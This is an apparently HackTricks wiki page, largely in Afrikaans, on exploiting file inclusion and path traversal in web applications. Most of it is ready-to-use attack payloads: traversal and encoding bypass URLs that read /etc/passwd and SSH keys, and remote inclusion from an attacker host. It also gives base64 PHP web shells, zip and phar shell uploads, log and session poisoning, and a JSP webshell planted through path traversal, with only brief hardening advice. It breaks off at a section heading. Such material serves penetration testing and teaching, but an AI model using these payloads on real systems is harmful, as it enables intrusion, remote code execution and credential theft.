# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word vanaf 'n afgeleë bediener gelaai (Beste: Jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit standaard **uitgeskakel** (**allow_url_include**).\
**Local File Inclusion (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op 'n of ander manier die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid uit te buit: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie *nix LFI-lyste te kombineer en meer paaie by te voeg het ek hierdie een geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` te verander na `\`\
Probeer ook om `../../../../../` by te voeg

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskeie wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` te verander na `\`\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van Linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences nie-rekursief verwyder
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass om meer karakters aan die einde van die verskafte string by te voeg (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Enkodering**

Jy kan nie-standaard enkoderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Van bestaande folder

Miskien kontroleer die back-end die folder path:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verkenning van lêerstelsel-gidse op 'n bediener

Die lêerstelsel van 'n bediener kan rekursief verken word om gidse, nie net lêers nie, te identifiseer deur sekere tegnieke toe te pas. Hierdie proses behels die vasstelling van die gidsdiepte en die ondersoek na die bestaan van spesifieke vouers. Hieronder is 'n gedetaileerde metode om dit te bereik:

1. **Bepaal die gidsdiepte:** Bepaal die diepte van jou huidige gids deur suksesvol die `/etc/passwd` lêer op te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan soos volg gestruktureer wees en 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Voeg die naam van die vermoedlike gids (bv. `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die addisionele gidsvlak vereis dat die diepte met een verhoog word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretasie van die Uitkomste:** Die bediener se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitvoer:** Die gids `private` bestaan waarskynlik nie op die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die gids `private` is bevestig.
4. **Rekursiewe Verkenning:** Gevonde gidse kan verder ondersoek word vir subgidse of lêers met dieselfde tegniek of tradisionele Local File Inclusion (LFI)-metodes.

Om gidse op verskillende plekke in die lêerstelsel te verken, pas die payload dienooreenkomstig aan. Byvoorbeeld, om te kontroleer of `/var/www/` 'n `private` gids bevat (aannemende die huidige gids is op 'n diepte van 3), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaadjies in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te kry deur sekere sekuriteitsmaatreëls te omseil wat ekstra karakters aan die einde van lêerpaadjies byvoeg. Die doel is om 'n lêerpad te konstruer wat, sodra dit deur die sekuriteitsmaatreël gewysig is, steeds na die gewenste lêer wys.

In PHP kan verskillende voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, en `/etc/passwd/` word almal as dieselfde pad beskou.
- Wanneer die laaste 6 karakters `passwd` is, verander die aanheg van ` / ` (waardeur dit `passwd/` word) nie die geteikende lêer nie.
- Net so, as `.php` aan 'n lêerpad aangeheg word (soos `shellcode.php`), sal die byvoeging van `/.` aan die einde nie die lêer wat geraadpleeg word verander nie.

Die voorbeelde hieronder demonstreer hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens die sensitiewe inhoud daarvan (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat benodig word ongeveer 2027 wees, maar hierdie getal kan wissel afhangende van die bediener se konfigurasie.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) combined with extra dot segments and characters kan gebruik word om deur die lêerstelsel te navigeer en effektief aangehegte strings deur die bediener te ignoreer.
- **Determining the Required Number of Traversals**: Deur proef en fout kan iemand die presiese aantal `../` sequences vind wat nodig is om na die root directory en dan na `/etc/passwd` te navigeer, en sodoende enige aangehegte stringe (soos `.php`) te neutraliseer terwyl die gewenste pad (`/etc/passwd`) ongeskonde bly.
- **Starting with a Fake Directory**: Dit is algemeen om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word as 'n voorsorgmaatreël gebruik of om aan die bediener se path parsing logic se vereistes te voldoen.

Wanneer path truncation techniques toegepas word, is dit noodsaaklik om die bediener se path parsing behavior en filesystem structure te verstaan. Elke scenario kan 'n ander benadering vereis, en toetsing is dikwels nodig om die mees doeltreffende metode te vind.

**Hierdie kwesbaarheid is reggestel in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** op **Off** is. Dit moet op **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou bediener insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
As om een of ander rede **`allow_url_include`** **On** is, maar PHP is **filtering** toegang tot eksterne webblaaie, [volgens hierdie pos](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data protocol met base64 gebruik om 'n b64 PHP-kode te decodeer en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die aanvaller 'n string nodig gehad het wat op `.txt` geëindig het, dus eindig die string daarmee en na die b64 decode sal daardie deel net rommel teruggee en die werklike PHP code ingesluit word (en dus uitgevoer).

Another example **wat nie die `php://` protokol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python wortelelement

In python, in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute path** aan **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en gaan die saamvoeging voort vanaf die absolute pad-komponent.

## Java - lys van gidse

Dit lyk asof as jy 'n Path Traversal in Java het en jy **vra vir 'n gids** in plaas van 'n lêer, 'n **lys van die gids teruggegee word**. Dit sal nie in ander tale gebeur nie (afaik).

## Top 25 parameters

Hier is 'n lys van die top 25 parameters wat vatbaar kan wees vir local file inclusion (LFI) (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI met PHP wrappers & protokolle

### php://filter

PHP-filters laat basiese **wysigingsoperasies op die data** toe voordat dit gelees of geskryf word. Daar is 5 kategorieë van filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen die "<" en ">" karakters)
- Let daarop dat hierdie filter in moderne weergawes van PHP verdwyn het
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander enkodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle kodings** wat ondersteun word te kry, voer in die konsole: `iconv -l`

> [!WARNING]
> Deur die `convert.iconv.*`-omsettingsfilter te misbruik kan jy **ewekansige teks genereer**, wat nuttig kan wees om ewekansige teks te skryf of om 'n funksie soos include te laat verwerk ewekansige teks. Vir meer inligting, sien [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie inligting wil eksfilleer)
- `zlib.inflate`: Dekompresseer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Ander Filters
- As jy in PHP `var_dump(stream_get_filters());` uitvoer, kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: keert HTTP chunked encoding om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die gedeelte "php://filter" is nie hoofletter-sensitief nie

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder dat die uitset deur die server teruggegee word. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters as oracle**. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak om php 'n exception te laat gooi.

In die oorspronklike post vind jy 'n gedetaileerde verduideliking van die tegniek, maar hier is 'n vinnige opsomming:

- Use the codec **`UCS-4LE`** om die voorste karakter van die teks aan die begin te laat en om die stringgrootte eksponensieel te laat toeneem.
- Hierdie sal gebruik word om 'n **teks te genereer wat so groot is wanneer die aanvanklike letter korrek geraden word** dat php 'n **error** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste char nie 'n hexadecimal is nie**, sodat ons kan weet of die eerste char hex is.
- Dit, gekombineer met die vorige (en ander filters afhangende van die geraade letter), sal ons toelaat om 'n letter aan die beginning van die teks te raai deur te sien wanneer ons genoeg transformasies doen om dit nie meer 'n hexadecimal karakter te maak nie. Want as dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal 'n php error veroorsaak.
- Die codec **convert.iconv.UNICODE.CP930** transformeer elke letter na die volgende (so na hierdie codec: a -> b). Dit laat ons toe om te ontdek of die eerste letter byvoorbeeld 'n `a` is, want as ons hierdie codec 6 keer toepas a->b->c->d->e->f->g, is die letter nie meer 'n hexadecimal karakter nie, daarom verwyder dechunk dit nie en word die php error getrigger omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies soos **rot13** aan die begin te gebruik is dit moontlik om ander chars te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters na die hex-reeks te skuif).
- Wanneer die aanvanklike char 'n nommer is, is dit nodig om dit base64 te encode en die eerste 2 letters te leak om die nommer te leak.
- Die finale probleem is om te sien **hoe om meer te leak as die aanvanklike letter**. Deur order memory filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik is dit moontlik om die volgorde van die chars te verander en ander letters van die teks in die eerste posisie te kry.
- En om in staat te wees om **further data** te verkry is die idee om **2 bytes of junk data at the beginning** te genereer met **convert.iconv.UTF16.UTF16**, pas **UCS-4LE** toe om dit te laat **pivot met die volgende 2 bytes**, en **verwyder die data tot by die junk data** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort om dit te doen totdat jy die gewenste bit bereik om te leak.

In die post is 'n tool om dit outomaties uit te voer ook leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper laat toe om toegang tot file descriptors wat die proses oop het. Potensieel nuttig om die content van geopende files te exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout and php://stderr** gebruik om toegang te kry tot die **file descriptors 0, 1 and 2** onderskeidelik (nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// and rar://

Laai 'n Zip of Rar-lêer op met 'n PHPShell daarin en kry daartoe toegang.\
Om die rar-protokol te kan misbruik moet dit **spesifiek geaktiveer word**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Let daarop dat hierdie protokol beperk is deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` gebruik om lêers te laai. Die PHP-kodesnippie hieronder demonstreer die skepping van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar` lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
By uitvoering sal 'n lêer met die naam `test.phar` geskep word, wat moontlik misbruik kan word om Local File Inclusion (LFI)-kwesbaarhede te eksploiteer.

In gevalle waar die LFI slegs lêers lees sonder om die PHP-kode daarin uit te voer — byvoorbeeld via funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()` — kan 'n poging aangewend word om 'n deserialisasie-kwesbaarheid te eksploiteer. Hierdie kwesbaarheid hou verband met die lees van lêers deur die gebruik van die `phar` protocol.

Vir 'n gedetailleerde begrip van die eksploitasie van deserialisasie-kwesbaarhede in die konteks van `.phar`-lêers, verwys na die dokument hieronder:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Dit was moontlik om **any arbitrary file read from PHP that supports php filters** te misbruik om 'n RCE te verkry. Die gedetailleerde beskrywing kan [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie kort samevatting: 'n **3 byte overflow** in die PHP heap is misbruik om die **ketting van free chunks** van 'n spesifieke grootte te verander sodat dit moontlik was om **write anything in any address**, daarom is 'n hook bygevoeg om **`system`** aan te roep.\ Dit was moontlik om chunks van spesifieke groottes te alloc deur meer php filters te misbruik.

### Meer protokolle

Kyk by meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URL's
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s) URL's
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind padname wat by 'n patroon pas (Dit gee niks printbaars terug nie, so nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio-strome (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-risiko's in PHP is veral hoog wanneer daar met die 'assert' funksie gewerk word, wat kode binne stringe kan uitvoer. Dit is veral problematies as insette wat directory traversal-karaktere soos ".." bevat, getoets word maar nie behoorlik gesuiwer nie.

Byvoorbeeld, PHP-kode mag ontwerp wees om directory traversal te voorkom soos volg:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Terwyl dit daarop gemik is om traversal te stop, skep dit onbedoeld 'n vektor vir code injection. Om dit te misbruik om lêerinhoud te lees, kan 'n attacker gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om arbitrêre stelselopdragte uit te voer, kan iemand gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **control** oor die **file path** van 'n **PHP function** het wat 'n **access a file** sal uitvoer, maar jy sal nie die inhoud van die lêer sien nie (soos 'n eenvoudige oproep na **`file()`**).

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As opsomming gebruik die tegniek die **"UCS-4LE" encoding** om die inhoud van 'n lêer so groot te maak dat die **PHP function opening** die lêer 'n fout sal veroorsaak.

Dan, om die eerste char te leak, word die filter **`dechunk`** gebruik tesame met ander soos **base64** of **rot13**, en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om ander chars aan die begin te plaas en hulle te leak.

**Funksies wat moontlik kwesbaar is**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, kyk die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wanneer server-side kode wat lêers ingevoer/opgelaai kry die bestemmingspad bou met gebruikersbeheerde data (bv. 'n filename of URL) sonder om dit te kanoniseer en te valideer, kan `..` segmente en absolute paaie die bedoelde gids verlaat en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-exposed directory kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell neer te sit.

Typical exploitation workflow:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n path/filename aanvaar en inhoud na die skyf skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-exposed directories. Algemene voorbeelde:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Skryf 'n traversal pad wat uit die bedoelde stoor-gids breek in die webroot, en sluit jou webshell-inhoud in.
- Blaai na die neergesette payload en voer opdragte uit.

Notas:
- Die kwetsbare diens wat die skryf uitvoer kan op 'n nie-HTTP poort luister (bv. 'n JMF XML listener op TCP 4004). Die hoof webportaal (anders poort) sal later jou payload bedien.
- Op Java stacks word hierdie lêerskrywings dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan canonicalisation/allow-listing is die kernfout.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Verharding wat hierdie klas foute neutraliseer:
- Los dit op na 'n kanoniese pad en dwing af dat dit 'n afstammeling is van 'n toegelate basismap.
- Verwerp enige pad wat `..`, absolute roots, of drive letters bevat; verkies gegenereerde lêernamme.
- Laat die writer loop as 'n laag-privilegieerde rekening en skei skryfgidse van geserveerde wortels.

## Remote File Inclusion

Eerder verduidelik, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

As die Apache- of Nginx-bediener **kwesbaar vir LFI** binne die include-funksie is, kan jy probeer toegang kry tot **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, 'n php shell soos **`<?php system($_GET['c']); ?>`** in die **user agent** of in 'n **GET parameter** plaas en daardie lêer include.

> [!WARNING]
> Let wel dat **as jy dubbel quotes gebruik** vir die shell in plaas van **simple quotes**, sal die dubbel quotes verander word na die string "_**quote;**_", **PHP sal daar 'n fout gooi** en **niks anders sal uitgevoer word**.
>
> Maak ook seker dat jy die **payload korrekt skryf** of PHP elke keer 'n fout sal gee wanneer dit probeer om die log file te laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word, maar **wees versigtig,** die kode binne die logs kan URL encoded wees en dit kan die Shell vernietig. Die header **authorisation "basic"** bevat "user:password" in Base64 en dit word binne die logs gedekodeer. Die PHPShell kan in hierdie header ingegooi word.\ Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing woordlys: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Deur e-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om die e-pos van die gebruiker in te sluit met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Deur /proc/*/fd/*

1. Laai baie shells op (byvoorbeeld: 100)
2. Sluit [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) in, with $PID = PID van die proses (kan met brute force probeer word) en $FD die file descriptor (kan ook met brute force probeer word)

### Deur /proc/self/environ

Soos 'n loglêer, stuur die payload in die User-Agent; dit sal in die /proc/self/environ-lêer weerspieël word.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Deur oplaai

As jy 'n lêer kan oplaai, injekteer net die shell payload daarin (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om dit in die metagegewens van die beelde/doc/pdf in te voeg

### Via ZIP-lêer oplaai

Laai 'n ZIP-lêer op wat 'n PHP shell bevat (gekompresseer) en kry toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Kontroleer of die webwerf PHP Session (PHPSESSID) gebruik.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessions gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessielêer in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Indien ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang kry tot **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Die logs vir die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Inspuit 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na inspuiting, gebruik die LFI om die bedienerlogs vanaf _**/var/log/vsftpd.log**_ te verkry.

### Via php base64 filter (using base64)

Soos getoon in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, PHP base64 filter ignoreer nie-base64 karakters. Jy kan dit gebruik om die lêeruitbreidingskontrole te omseil: as jy base64 voorsien wat eindig met ".php", sal dit net die "." ignoreer en "php" aan die base64 heg. Hier is 'n voorbeeld payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (geen lêer nodig)

